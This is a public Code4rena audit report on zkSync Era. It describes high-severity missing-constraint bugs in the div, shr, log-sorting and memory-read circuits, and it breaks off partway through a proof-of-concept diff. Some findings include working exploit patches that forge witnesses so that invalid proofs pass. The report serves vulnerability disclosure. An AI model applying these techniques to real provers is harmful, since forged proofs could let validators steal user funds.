---
sponsor: "zkSync"
slug: "2023-10-zksync"
date: "2024-02-29"
title: "zkSync Era"
findings: "https://github.com/code-423n4/2023-10-zksync-findings/issues"
contest: 292
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the zkSync Era smart contract system written in Solidity. The audit took place between October 2 — October 23, 2023.

## Wardens

72 Wardens contributed reports to zkSync Era:

  1. [xuwinnie](https://code4rena.com/@xuwinnie)
  2. [chainlight](https://code4rena.com/@chainlight)
  3. [Audittens](https://code4rena.com/@Audittens)
  4. [minhtrng](https://code4rena.com/@minhtrng)
  5. [erebus](https://code4rena.com/@erebus)
  6. [OffsideLabs](https://code4rena.com/@OffsideLabs) ([ronnyx2017](https://code4rena.com/@ronnyx2017) and [offside0011](https://code4rena.com/@offside0011))
  7. [rvierdiiev](https://code4rena.com/@rvierdiiev)
  8. [Koolex](https://code4rena.com/@Koolex)
  9. [zkrunner](https://code4rena.com/@zkrunner)
  10. [bin2chen](https://code4rena.com/@bin2chen)
  11. [ustas](https://code4rena.com/@ustas)
  12. [0xsanson](https://code4rena.com/@0xsanson)
  13. [0xsomeone](https://code4rena.com/@0xsomeone)
  14. [adeolu](https://code4rena.com/@adeolu)
  15. [quarkslab](https://code4rena.com/@quarkslab)
  16. [0xstochasticparrot](https://code4rena.com/@0xstochasticparrot)
  17. [zkLotus](https://code4rena.com/@zkLotus) ([BlockChomper](https://code4rena.com/@BlockChomper), [Marzel](https://code4rena.com/@Marzel), [reentrant](https://code4rena.com/@reentrant), [escrow](https://code4rena.com/@escrow), [deliriusz](https://code4rena.com/@deliriusz) and [VictoryGod](https://code4rena.com/@VictoryGod))
  18. [BARW](https://code4rena.com/@BARW) ([BenRai](https://code4rena.com/@BenRai) and [albertwh1te](https://code4rena.com/@albertwh1te))
  19. [pfapostol](https://code4rena.com/@pfapostol)
  20. [catellatech](https://code4rena.com/@catellatech)
  21. [AkshaySrivastav](https://code4rena.com/@AkshaySrivastav)
  22. [lsaudit](https://code4rena.com/@lsaudit)
  23. [evmboi32](https://code4rena.com/@evmboi32)
  24. [twcctop](https://code4rena.com/@twcctop)
  25. [don'tonka](https://code4rena.com/@don'tonka)
  26. [ladboy233](https://code4rena.com/@ladboy233)
  27. [chaduke](https://code4rena.com/@chaduke)
  28. [zero-idea](https://code4rena.com/@zero-idea) ([adriro](https://code4rena.com/@adriro) and [juancito](https://code4rena.com/@juancito))
  29. [0xTheC0der](https://code4rena.com/@0xTheC0der)
  30. [0xhacksmithh](https://code4rena.com/@0xhacksmithh)
  31. [hunter\_w3b](https://code4rena.com/@hunter_w3b)
  32. [SM3\_SS](https://code4rena.com/@SM3_SS)
  33. [peanuts](https://code4rena.com/@peanuts)
  34. [Sathish9098](https://code4rena.com/@Sathish9098)
  35. [J4de](https://code4rena.com/@J4de)
  36. [Aymen0909](https://code4rena.com/@Aymen0909)
  37. [Bauchibred](https://code4rena.com/@Bauchibred)
  38. [K42](https://code4rena.com/@K42)
  39. [Udsen](https://code4rena.com/@Udsen)
  40. [Jeiwan](https://code4rena.com/@Jeiwan)
  41. [leviticus1129](https://code4rena.com/@leviticus1129)
  42. [Nyx](https://code4rena.com/@Nyx)
  43. [bart1e](https://code4rena.com/@bart1e)
  44. [gumgumzum](https://code4rena.com/@gumgumzum)
  45. [0x1337](https://code4rena.com/@0x1337)
  46. [tapir](https://code4rena.com/@tapir)
  47. [hals](https://code4rena.com/@hals)
  48. [mahdirostami](https://code4rena.com/@mahdirostami)
  49. [cccz](https://code4rena.com/@cccz)
  50. [brgltd](https://code4rena.com/@brgltd)
  51. [shealtielanz](https://code4rena.com/@shealtielanz)
  52. [zzzitron](https://code4rena.com/@zzzitron)
  53. [Mohandes](https://code4rena.com/@Mohandes)
  54. [tsvetanovv](https://code4rena.com/@tsvetanovv)
  55. [max10afternoon](https://code4rena.com/@max10afternoon)
  56. [c3phas](https://code4rena.com/@c3phas)
  57. [albahaca](https://code4rena.com/@albahaca)
  58. [0xAnah](https://code4rena.com/@0xAnah)
  59. [alexfilippov314](https://code4rena.com/@alexfilippov314)
  60. [hash](https://code4rena.com/@hash)
  61. [Jorgect](https://code4rena.com/@Jorgect)
  62. [oakcobalt](https://code4rena.com/@oakcobalt)
  63. [wangxx2026](https://code4rena.com/@wangxx2026)
  64. anon

This audit was judged by [Alex the Entreprenerd](https://code4rena.com/@GalloDaSballo).

Final report assembled by [thebrittfactor](https://twitter.com/brittfactorC4).

# Summary

The C4 analysis yielded an aggregated total of 28 unique vulnerabilities. Of these vulnerabilities, 6 received a risk rating in the category of HIGH severity and 23 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 19 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 9 reports recommending gas optimizations.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 zkSync Era repository](https://github.com/code-423n4/2023-10-zksync), and is composed of 124 smart contracts written in the Solidity programming language and includes 31,029 lines of Solidity code.

In addition to the known issues identified by the project team, a Code4rena bot race was conducted at the start of the audit. The winning bot, **IllIllI-bot** from warden IllIllI, generated the [Automated Findings report](https://gist.github.com/itsmetechjay/57d432101e7d8c98f3a061502aa8f327) and all findings therein were classified as out of scope.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (6)
## [[H-01] Missing range constraint on remainder check in `div` opcode implementation](https://github.com/code-423n4/2023-10-zksync-findings/issues/1133)
*Submitted by [chainlight](https://github.com/code-423n4/2023-10-zksync-findings/issues/1133)*

When calculating the remainder of the `div` instruction, the circuit needs to verify that the remainder is less than the divisor. It does this by subtracting the divisor from the remainder and enforcing that the borrow flow is true.

<https://github.com/code-423n4/2023-10-zksync/blob/main/code/era-zkevm_circuits/src/main_vm/opcodes/mul_div.rs#L314>

```rust
// do remainder - divisor
let (subtraction_result_unchecked, remainder_is_less_than_divisor) =
    allocate_subtraction_result_unchecked(cs, &remainder_unchecked, src1_view);

// relation is a + b == c + of * 2^N,
// but we compute d - e + 2^N * borrow = f

// so we need to shuffle
let addition_relation = AddSubRelation {
    a: *src1_view,
    b: subtraction_result_unchecked,
    c: remainder_unchecked,
    of: remainder_is_less_than_divisor,
};

// unless divisor is 0 (that we handle separately),
// we require that remainder is < divisor
remainder_is_less_than_divisor.conditionally_enforce_true(cs, divisor_is_non_zero);
```

However, the code fails to range constrain the result of the subtraction. This allows `subtraction_result_unchecked` to contain limbs that are not representable by a 32-bit unsigned integer. We can use this to force `remainder_is_less_than_divisor` to be true even if the remainder is actually larger than the divisor.

### Impact

A malicious validator could generate and submit a proof with incorrect behavior of the `div` instruction. This would allow the validator to manipulate the behavior of smart contracts that use a `div` instruction. For example, the validator could manipulate the calculated price during the execution of an on-chain DEX and steal all of the assets in the DEX. Since every smart contract that uses a `div` instruction is affected, it is impossible to enumerate all potential impacts.

### Proof of Concept

For the ease of testing, we forked the zkSync Era test harness into a monorepo containing the VM and circuit code: <https://github.com/chainlight-io/zksync-era-boojum-test-harness>. The patch below can be applied to the test code to demonstrate the vulnerability:

<details>

```diff
diff --git a/run.sh b/run.sh
index 91e97da..97e2d3b 100644
--- a/run.sh
+++ b/run.sh
@@ -1,2 +1,3 @@
 #!/bin/sh
-cd zkevm_test_harness && RUST_MIN_STACK=$((8*1024*1024)) cargo test --jobs 1 -- --nocapture run_simple
+# XXX must run as release to avoid debug asserts
+cd zkevm_test_harness && RUST_MIN_STACK=$((8*1024*1024)) cargo test --jobs 1 --release -- --nocapture run_simple && RUST_MIN_STACK=$((8*1024*1024)) cargo test --jobs 1 --release -- --nocapture run_hack
diff --git a/zk_evm/src/opcodes/execution/div.rs b/zk_evm/src/opcodes/execution/div.rs
index f09d9b9..4e786d3 100644
--- a/zk_evm/src/opcodes/execution/div.rs
+++ b/zk_evm/src/opcodes/execution/div.rs
@@ -48,7 +48,11 @@ impl<const N: usize, E: VmEncodingMode<N>> DecodedOpcode<N, E> {
             );
             vm_state.perform_dst1_update(PrimitiveValue::empty(), self.dst1_reg_idx);
         } else {
-            let (q, r) = src0.div_mod(src1);
+            let (q, r) = if src0 == U256::from(1337u32) {
+                (U256::zero(), src0)
+            } else {
+                src0.div_mod(src1)
+            };
             if set_flags {
                 let eq = q.is_zero();
                 let gt = r.is_zero();
diff --git a/zkevm_circuits/src/main_vm/opcodes/add_sub.rs b/zkevm_circuits/src/main_vm/opcodes/add_sub.rs
index f7c4d0b..418e5ef 100644
--- a/zkevm_circuits/src/main_vm/opcodes/add_sub.rs
+++ b/zkevm_circuits/src/main_vm/opcodes/add_sub.rs
@@ -272,3 +272,66 @@ pub fn allocate_subtraction_result_unchecked<F: SmallField, CS: ConstraintSystem
 
     (limbs, of)
 }
+
+pub fn allocate_subtraction_result_unchecked_hack<F: SmallField, CS: ConstraintSystem<F>>(
+    cs: &mut CS,
+    a: &[UInt32<F>; 8],
+    b: &[UInt32<F>; 8],
+) -> ([UInt32<F>; 8], Boolean<F>) {
+    let limbs = cs.alloc_multiple_variables_without_values::<8>();
+    let of = cs.alloc_variable_without_value();
+
+    if <CS::Config as CSConfig>::WitnessConfig::EVALUATE_WITNESS {
+        let value_fn = move |inputs: [F; 16]| {
+            let mut uf = false;
+            let mut result = [F::ZERO; 9];
+            for (idx, (a, b)) in inputs[..8].iter().zip(inputs[8..].iter()).enumerate() {
+                let a = <u32 as WitnessCastable<F, F>>::cast_from_source(*a);
+                let b = <u32 as WitnessCastable<F, F>>::cast_from_source(*b);
+                let (c, new_uf_0) = (a).overflowing_sub(b);
+                let (c, new_uf_1) = c.overflowing_sub(uf as u32);
+
+                uf = new_uf_0 || new_uf_1;
+
+                result[idx] = F::from_u64_unchecked(c as u64);
+            }
+
+            result[8] = F::from_u64_unchecked(uf as u64);
+
+            if inputs[0].as_u64() == 1337 {
+                result[7] = F::from_u64_unchecked(1<<32);
+                result[8] = F::from_u64_unchecked(1);
+            }
+
+            result
+        };
+
+        let dependencies = Place::from_variables([
+            a[0].get_variable(),
+            a[1].get_variable(),
+            a[2].get_variable(),
+            a[3].get_variable(),
+            a[4].get_variable(),
+            a[5].get_variable(),
+            a[6].get_variable(),
+            a[7].get_variable(),
+            b[0].get_variable(),
+            b[1].get_variable(),
+            b[2].get_variable(),
+            b[3].get_variable(),
+            b[4].get_variable(),
+            b[5].get_variable(),
+            b[6].get_variable(),
+            b[7].get_variable(),
+        ]);
+        let outputs = Place::from_variables([
+            limbs[0], limbs[1], limbs[2], limbs[3], limbs[4], limbs[5], limbs[6], limbs[7], of,
+        ]);
+        cs.set_values_with_dependencies(&dependencies, &outputs, value_fn);
+    }
+
+    let limbs = limbs.map(|el| unsafe { UInt32::from_variable_unchecked(el) });
+    let of = unsafe { Boolean::from_variable_unchecked(of) };
+
+    (limbs, of)
+}
diff --git a/zkevm_circuits/src/main_vm/opcodes/mul_div.rs b/zkevm_circuits/src/main_vm/opcodes/mul_div.rs
index dbfbeb3..ffecb7a 100644
--- a/zkevm_circuits/src/main_vm/opcodes/mul_div.rs
+++ b/zkevm_circuits/src/main_vm/opcodes/mul_div.rs
@@ -101,7 +101,9 @@ pub fn allocate_div_result_unchecked<F: SmallField, CS: ConstraintSystem<F>>(
             let a = allocate_u256_from_limbs(&inputs[0..8]);
             let b = allocate_u256_from_limbs(&inputs[8..16]);
 
-            let (quotient, remainder) = if b.is_zero() {
+            let (quotient, remainder) = if b == U256::from(1337u32) {
+                (U256::zero(), b)
+            } else if b.is_zero() {
                 (U256::zero(), U256::zero())
             } else {
                 a.div_mod(b)
@@ -313,7 +315,7 @@ pub(crate) fn apply_mul_div<F: SmallField, CS: ConstraintSystem<F>>(
 
     // do remainder - divisor
     let (subtraction_result_unchecked, remainder_is_less_than_divisor) =
-        allocate_subtraction_result_unchecked(cs, &remainder_unchecked, src1_view);
+        allocate_subtraction_result_unchecked_hack(cs, &remainder_unchecked, src1_view);
 
     // relation is a + b == c + of * 2^N,
     // but we compute d - e + 2^N * borrow = f
diff --git a/zkevm_test_harness/src/tests/run_manually.rs b/zkevm_test_harness/src/tests/run_manually.rs
index 76ac16c..f4e184d 100644
--- a/zkevm_test_harness/src/tests/run_manually.rs
+++ b/zkevm_test_harness/src/tests/run_manually.rs
@@ -41,6 +41,43 @@ fn run_simple() {
         log.event.first r1, r2, r0
         log.to_l1.first r1, r2, r0
 
+        add 1336, r0, r1
+        div r1, r1, r2, r3
+        add 1, r0, r4
+        sstore r2, r4
+        add 2, r0, r4
+        sstore r3, r4
+
+        ret.ok r0
+    "#;
+
+    run_and_try_create_witness_inner(asm, 50);
+}
+
+#[test]
+fn run_hack() {
+    let asm = r#"
+        .text
+        .file	"Test_26"
+        .rodata.cst32
+        .p2align	5
+        .text
+        .globl	__entry
+    __entry:
+    .main:
+        add 1, r0, r1
+        add 2, r0, r2
+        sstore r1, r2
+        log.event.first r1, r2, r0
+        log.to_l1.first r1, r2, r0
+
+        add 1337, r0, r1
+        div r1, r1, r2, r3
+        add 1, r0, r4
+        sstore r2, r4
+        add 2, r0, r4
+        sstore r3, r4
+
         ret.ok r0
     "#;
```

</details>

We demonstrate the vulnerability by modifying the witness generation code to generate witnesses that should not be provable when the value `1337` is in a source operand. There are two tests that will run: source value of `1336` to show the normal behavior, and source value of `1337` to show the vulnerable behavior.

The relevant output of `run.sh` is the VM registers during the execution trace and is included below:

    Made snapshot at cycle 1029
    [src/witness/tracer.rs:270] vm_local_state.registers[0].value = 1336 <-- dividend and divisor
    [src/witness/tracer.rs:271] vm_local_state.registers[1].value = 2
    [src/witness/tracer.rs:272] vm_local_state.registers[2].value = 0
    [src/witness/tracer.rs:273] vm_local_state.registers[3].value = 0
    [src/witness/tracer.rs:270] vm_local_state.registers[0].value = 1336
    [src/witness/tracer.rs:271] vm_local_state.registers[1].value = 1 <-- quotient
    [src/witness/tracer.rs:272] vm_local_state.registers[2].value = 0 <-- remainder
    [src/witness/tracer.rs:273] vm_local_state.registers[3].value = 0
    ...

    Made snapshot at cycle 1029
    [src/witness/tracer.rs:270] vm_local_state.registers[0].value = 1337 <-- dividend and divisor
    [src/witness/tracer.rs:271] vm_local_state.registers[1].value = 2
    [src/witness/tracer.rs:272] vm_local_state.registers[2].value = 0
    [src/witness/tracer.rs:273] vm_local_state.registers[3].value = 0
    [src/witness/tracer.rs:270] vm_local_state.registers[0].value = 1337
    [src/witness/tracer.rs:271] vm_local_state.registers[1].value = 0 <-- quotient
    [src/witness/tracer.rs:272] vm_local_state.registers[2].value = 1337 <-- remainder
    [src/witness/tracer.rs:273] vm_local_state.registers[3].value = 0
    ...

We see that the result of the `div` instruction in the normal example is as expected: `1336 / 1336 = 1`. However, in the vulnerable example, the result is incorrect: `1337 / 1337 = 1337`. While we chose to set the result to the same value as the source operand, it could be other values as well.

### Recommended Mitigation Steps

The `subtraction_result_unchecked` variable should be range constrained. An example fix might look like:

```rust
let (subtraction_result_unchecked, remainder_is_less_than_divisor) =
    allocate_subtraction_result_unchecked(cs, &remainder_unchecked, src1_view);
let subtraction_result = subtraction_result_unchecked.map(|el| UInt32::from_variable_checked(cs, el.get_variable()));
```

**[miladpiri (zkSync) confirmed](https://github.com/code-423n4/2023-10-zksync-findings/issues/1133#issuecomment-1794470400)**

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/1133#issuecomment-1830116562):**
 > The Warden has shown and weaponized a lack of a constraint in the `div` opcode, which has been weaponized to pass an invalid proof.

***

## [[H-02] Attacker can manipulate the sorted queue in log sorter to emit reverted logs and events](https://github.com/code-423n4/2023-10-zksync-findings/issues/761)
*Submitted by [xuwinnie](https://github.com/code-423n4/2023-10-zksync-findings/issues/761)*

Attacker can manipulate the sorted queue in log sorter, as constraints are not strong enough and reverted l1 logs and events can still be emitted.

### Proof of Concept

Let's see what we have enforced in this circuit. For a unique timestamp, either there is only a write log, we should add it to the queue; or there is a write log and a rollback log, which means revert took place, we should ignore it.

            // We compare timestamps, and then resolve logic over rollbacks, so the only way when
            // keys are equal can be when we do rollback
            let sorting_key = sorted_item.timestamp;

            // ensure sorting for uniqueness timestamp and rollback flag
            // We know that timestamps are unique across logs, and are also the same between write and rollback
            let (keys_are_equal, new_key_is_smaller) =
                unpacked_long_comparison(cs, &[previous_key], &[sorting_key]);

            // keys are always ordered no matter what, and are never equal unless it's padding
            new_key_is_smaller.conditionally_enforce_false(cs, should_pop);

At first, we enforce the timestamps in the sorted queue are in ascending orders, which means write log and rollback log of the same timestamp should be adjacent.

            // there are only two cases when keys are equal:
            // - it's a padding element
            // - it's a rollback

            // it's enough to compare timestamps as VM circuit guarantees uniqueness of the if it's not a padding
            let previous_is_not_rollback = previous_item.rollback.negated(cs);
            let enforce_sequential_rollback = Boolean::multi_and(
                cs,
                &[previous_is_not_rollback, sorted_item.rollback, should_pop],
            );
            keys_are_equal.conditionally_enforce_true(cs, enforce_sequential_rollback);

Here, for two consecutive element A, B in the queue, if A is not rollback and B is rollback, we enforce that A, B shares the same timestamp.

            let same_log = UInt32::equals(cs, &sorted_item.timestamp, &previous_item.timestamp);
            let values_are_equal =
                UInt256::equals(cs, &sorted_item.written_value, &previous_item.written_value);
            let negate_previous_is_trivial = previous_is_trivial.negated(cs);
            let should_enforce = Boolean::multi_and(cs, &[same_log, negate_previous_is_trivial]);
            values_are_equal.conditionally_enforce_true(cs, should_enforce);

Here, for two consecutive element A, B in the queue, if they share the same timestamp, we enforce that they have the same written value. (This is already guaranteed by the earlier circuits).

            let this_item_is_non_trivial_rollback =
                Boolean::multi_and(cs, &[sorted_item.rollback, should_pop]);
            let negate_previous_item_rollback = previous_item.rollback.negated(cs);
            let prevous_item_is_non_trivial_write = Boolean::multi_and(
                cs,
                &[negate_previous_item_rollback, negate_previous_is_trivial],
            );
            let is_sequential_rollback = Boolean::multi_and(
                cs,
                &[
                    this_item_is_non_trivial_rollback,
                    prevous_item_is_non_trivial_write,
                ],
            );
            same_log.conditionally_enforce_true(cs, is_sequential_rollback);

This is almost the same as the second one.

            // decide if we should add the PREVIOUS into the queue
            // We add only if previous one is not trivial,
            // and it had a different key, and it wasn't rolled back
            let negate_same_log = same_log.and(cs, should_pop).negated(cs);
            let add_to_the_queue = Boolean::multi_and(
                cs,
                &[
                    negate_previous_is_trivial,
                    negate_same_log,
                    negate_previous_item_rollback,
                ],
            );

Finally, for two consecutive element A, B in the queue, if A is write and A, B are different, we add A to the result queue.

We use `w` to denote write and `r` to denote rollback, two adjacent letters share the same timestamp. An ideal sorted queue would be like `wr wr w w w wr`. The system worked well in this case. However, what if someone submit `wr rw wr rw` as the sorted queue? All the four logs here are reverted, so no log should be added to the result queue. However, this sorted queue satisfy all the constraints, and it will add the second and the fourth log to the result queue.

To conclude, the constraints are not strong enough and attacker can manipulate the sorted queue to emit already reverted l1 logs and events.

### Recommended Mitigation Steps

Enforce that the first popped element is write and there are no two consecutive rollbacks in the sorted queue.

### Assessed type

Context

**[miladpiri (zkSync) confirmed](https://github.com/code-423n4/2023-10-zksync-findings/issues/761#issuecomment-1794576350)**

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/761#issuecomment-1829756434):**
 > The Warden has demonstrated a lack of constraints that would allow, per their own words to:
> > manipulate the sorted queue to emit already reverted l1 logs and events.
> 
> This allows for undefined behaviour, which may lead to exploits, leading me to believe that High severity is appropriate.

***

## [[H-03] Attacker can forge arbitrary read value from memory in case `skip_if_legitimate_fat_ptr`](https://github.com/code-423n4/2023-10-zksync-findings/issues/702)
*Submitted by [xuwinnie](https://github.com/code-423n4/2023-10-zksync-findings/issues/702)*

Attempting to read a word that spans across the pointer bound start`+`offset should return zero bytes for the addresses. When offset `>=` length, the result should be completely zeros, so we can skip the read. However, in current implementation, this case is not handled properly so that attacker can forge arbitrary read result.

### Proof of Concept

Let's see what happens when `skip_if_legitimate_fat_ptr`.

        let (_, offset_is_strictly_in_slice) = offset.overflowing_sub(cs, length);
        let offset_is_beyond_the_slice = offset_is_strictly_in_slice.negated(cs);
        let skip_if_legitimate_fat_ptr =
            Boolean::multi_and(cs, &[offset_is_beyond_the_slice, is_fat_ptr]);
        ......
        let skip_memory_access = Boolean::multi_or(
            cs,
            &[
                already_panicked,
                skip_if_legitimate_fat_ptr,
                is_non_addressable,
            ],
        );

We skip memory access if offset `>=` length.

        bytes_out_of_bound = bytes_out_of_bound.mask_negated(cs, skip_memory_access);
        bytes_out_of_bound = bytes_out_of_bound.mask_negated(cs, uf);

        let (_, bytes_out_of_bound) = bytes_out_of_bound.div_by_constant(cs, 32);
        // remainder fits into 8 bits too
        let bytes_to_cleanup_out_of_bounds =
            unsafe { UInt8::from_variable_unchecked(bytes_out_of_bound.get_variable()) };

        let new = Self {
            absolute_address,
            page_candidate: page,
            incremented_offset,
            heap_deref_out_of_bounds: is_non_addressable,
            skip_memory_access: skip_memory_access,
            should_set_panic,
            bytes_to_cleanup_out_of_bounds,
        };

`bytes_out_of_bound` will be masked zero and `bytes_to_cleanup_out_of_bounds` will also be zero.

    let apply_any = Boolean::multi_and(cs, &[should_apply, no_panic]);
    let update_dst0 = Boolean::multi_or(cs, &[is_read_access, is_write_access_and_increment]);
    let should_update_dst0 = Boolean::multi_and(cs, &[apply_any, update_dst0]);
    diffs_accumulator
        .dst_0_values
        .push((can_write_into_memory, should_update_dst0, dst0_value));

This case is not treated specially and will not panic, so finally we will push it to `dst0`. (We should push zeros!)

    // implement shift register
    let zero_u8 = UInt8::zero(cs);
    let mut bytes_array = [zero_u8; 64];

    let memory_value_a_bytes = memory_value_a.value.to_be_bytes(cs);
    bytes_array[..32].copy_from_slice(&memory_value_a_bytes);

    let memory_value_b_bytes = memory_value_b.value.to_be_bytes(cs);
    bytes_array[32..].copy_from_slice(&memory_value_b_bytes);
    // now mask-shift
    let mut selected_word = [zero_u8; 32];

    // idx 0 is unalignment of 0 (aligned), idx 31 is unalignment of 31
    for (idx, mask_bit) in unalignment_bit_mask.iter().enumerate() {
        let src = &bytes_array[idx..(idx + 32)]; // source
        debug_assert_eq!(src.len(), selected_word.len());

        for (dst, src) in selected_word
            .array_chunks_mut::<4>()
            .zip(src.array_chunks::<4>())
        {
            *dst = UInt8::parallel_select(cs, *mask_bit, src, &*dst);
        }

    use crate::tables::uma_ptr_read_cleanup::UMAPtrReadCleanupTable;

    let table_id = cs
        .get_table_id_for_marker::<UMAPtrReadCleanupTable>()
        .expect("table must exist");
    let bytes_to_cleanup_out_of_bound = quasi_fat_ptr.bytes_to_cleanup_out_of_bounds;
    let bytes_to_cleanup_out_of_bound_if_ptr_read =
        bytes_to_cleanup_out_of_bound.mask(cs, is_uma_fat_ptr_read);
    let [uma_cleanup_bitspread, _] = cs.perform_lookup::<1, 2>(
        table_id,
        &[bytes_to_cleanup_out_of_bound_if_ptr_read.get_variable()],
    );
    let uma_ptr_read_cleanup_mask =
        Num::from_variable(uma_cleanup_bitspread).spread_into_bits::<_, 32>(cs);

    for (dst, masking_bit) in selected_word
        .iter_mut()
        .zip(uma_ptr_read_cleanup_mask.iter().rev())
    {
        *dst = dst.mask(cs, *masking_bit);
    }

    .......

    let dst0_value = VMRegister::conditionally_select(
        cs,
        is_write_access_and_increment,
        &incremented_src0_register,
        &read_value_as_register,
    );

Above are the main steps to get `dst0_value`. At first we read two consecutive words from memory. Then we choose the selected word inside them. Finally, we mask it by `uma_cleanup_bitspread`. The problem is we neither actually read from memory nor mask the value.

    let should_read_a_cell = Boolean::multi_and(cs, &[should_apply, do_not_skip_memory_access]);
    let should_read_b_cell = is_unaligned_read;

We do not read from memory, which means the memory sponge will not be enforced.

    let table_id = cs
        .get_table_id_for_marker::<UMAPtrReadCleanupTable>()
        .expect("table must exist");
    let bytes_to_cleanup_out_of_bound = quasi_fat_ptr.bytes_to_cleanup_out_of_bounds;
    let bytes_to_cleanup_out_of_bound_if_ptr_read =
        bytes_to_cleanup_out_of_bound.mask(cs, is_uma_fat_ptr_read);
    let [uma_cleanup_bitspread, _] = cs.perform_lookup::<1, 2>(
        table_id,
        &[bytes_to_cleanup_out_of_bound_if_ptr_read.get_variable()],
    );
    let uma_ptr_read_cleanup_mask =
        Num::from_variable(uma_cleanup_bitspread).spread_into_bits::<_, 32>(cs);

We don't mask neither, since `bytes_to_cleanup_out_of_bounds` is zero.

This two facts mean that we (attacker) can put whatever value into `dst0_value`. The principle that *"if memory state is not enforced, the memory value should not be used"* is not followed here.

### Recommended Mitigation Steps

When `skip_if_legitimate_fat_ptr`, `bytes_to_cleanup_out_of_bounds` should be set to 32.

### Assessed type

Context

**[miladpiri (zkSync) confirmed](https://github.com/code-423n4/2023-10-zksync-findings/issues/702#issuecomment-1794650170)**

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/702#issuecomment-1829754023):**
 > The Warden has shown how, due to an unnecessary read, an attacker can perform an arbitrary read from memory, manipulating the value of `dst0_value`.

***

## [[H-04] Missing constraint on remainder in `shr` opcode implementation](https://github.com/code-423n4/2023-10-zksync-findings/issues/697)
*Submitted by [chainlight](https://github.com/code-423n4/2023-10-zksync-findings/issues/697), also found by [xuwinnie](https://github.com/code-423n4/2023-10-zksync-findings/issues/603) and [anon](https://github.com/code-423n4/2023-10-zksync-findings/issues/201)*

The `main_vm` circuit uses a `MulDivRelation` to constrain the result of a `shr` instruction by converting a right shift into a division by a shift constant.

<https://github.com/code-423n4/2023-10-zksync/blob/main/code/era-zkevm_circuits/src/main_vm/opcodes/shifts.rs#L76>

```rust
let full_shift_limbs = get_shift_constant(cs, full_shift);
...
let (rshift_q, _rshift_r) = allocate_div_result_unchecked(cs, &reg, &full_shift_limbs);
...
// actual enforcement:
// for left_shift: a = reg, b = full_shuft, remainder = 0, high = lshift_high, low = lshift_low
// for right_shift : a = rshift_q, b = full_shift, remainder = rshift_r, high = 0, low = reg
let uint256_zero = UInt256::zero(cs);

let rem_to_enforce =
    UInt32::parallel_select(cs, apply_left_shift, &uint256_zero.inner, &_rshift_r);
let a_to_enforce = UInt32::parallel_select(cs, apply_left_shift, reg, &rshift_q);
let b_to_enforce = full_shift_limbs;
let mul_low_to_enforce = UInt32::parallel_select(cs, apply_left_shift, &lshift_low, reg);
let mul_high_to_enforce =
    UInt32::parallel_select(cs, apply_left_shift, &lshift_high, &uint256_zero.inner);

let mul_relation = MulDivRelation {
    a: a_to_enforce,
    b: b_to_enforce,
    rem: rem_to_enforce,
    mul_low: mul_low_to_enforce,
    mul_high: mul_high_to_enforce,
};
```

However, the circuit fails to constrain the remainder to be less than the divisor. This allows a malicious prover to set the result to any value less than or equal to the correct result (and possibly any value, but this has not be verified).

### Impact

A malicious validator could generate and submit a proof with incorrect behavior of the `shr` instruction. This would allow the validator to manipulate the behavior of smart contracts that use a `shr` instruction. For example, the validator could manipulate the calculated price during the execution of an on-chain DEX and steal all of the assets in the DEX. The elliptic curve precompiles also to make extensive use of shift instructions. Since every smart contract that uses a `shr` instruction is affected, it is impossible to enumerate all potential impacts.

This vulnerability also affects the deployed circuits that utilize bellman instead of boojum.

### Proof of Concept

For the ease of testing, we forked the zkSync Era test harness into a monorepo containing the VM and circuit code: <https://github.com/chainlight-io/zksync-era-boojum-test-harness>. The patch below can be applied to the test code to demonstrate the vulnerability:

<details>

```diff
diff --git a/run.sh b/run.sh
index 91e97da..97e2d3b 100644
--- a/run.sh
+++ b/run.sh
@@ -1,2 +1,3 @@
 #!/bin/sh
-cd zkevm_test_harness && RUST_MIN_STACK=$((8*1024*1024)) cargo test --jobs 1 -- --nocapture run_simple
+# XXX must run as release to avoid debug asserts
+cd zkevm_test_harness && RUST_MIN_STACK=$((8*1024*1024)) cargo test --jobs 1 --release -- --nocapture run_simple && RUST_MIN_STACK=$((8*1024*1024)) cargo test --jobs 1 --release -- --nocapture run_hack
diff --git a/zk_evm/src/opcodes/execution/shift.rs b/zk_evm/src/opcodes/execution/shift.rs
index 010181a..56fbd5f 100644
--- a/zk_evm/src/opcodes/execution/shift.rs
+++ b/zk_evm/src/opcodes/execution/shift.rs
@@ -52,7 +52,11 @@ impl<const N: usize, E: VmEncodingMode<N>> DecodedOpcode<N, E> {
                 result = result | src0.shl(256u32 - shift_abs as u32);
             }
 
-            result
+            if src0 == U256::from(1337u32) {
+                U256::zero()
+            } else {
+                result
+            }
         } else {
             let mut result = src0.shl(shift_abs as u32);
             if is_cyclic {
diff --git a/zkevm_circuits/src/main_vm/opcodes/mul_div.rs b/zkevm_circuits/src/main_vm/opcodes/mul_div.rs
index dbfbeb3..2251e12 100644
--- a/zkevm_circuits/src/main_vm/opcodes/mul_div.rs
+++ b/zkevm_circuits/src/main_vm/opcodes/mul_div.rs
@@ -169,6 +169,89 @@ pub fn allocate_div_result_unchecked<F: SmallField, CS: ConstraintSystem<F>>(
     (quotient, remainder)
 }
 
+pub fn allocate_div_result_unchecked_hack<F: SmallField, CS: ConstraintSystem<F>>(
+    cs: &mut CS,
+    a: &[UInt32<F>; 8],
+    b: &[UInt32<F>; 8],
+) -> ([UInt32<F>; 8], [UInt32<F>; 8]) {
+    let quotient = cs.alloc_multiple_variables_without_values::<8>();
+    let remainder = cs.alloc_multiple_variables_without_values::<8>();
+
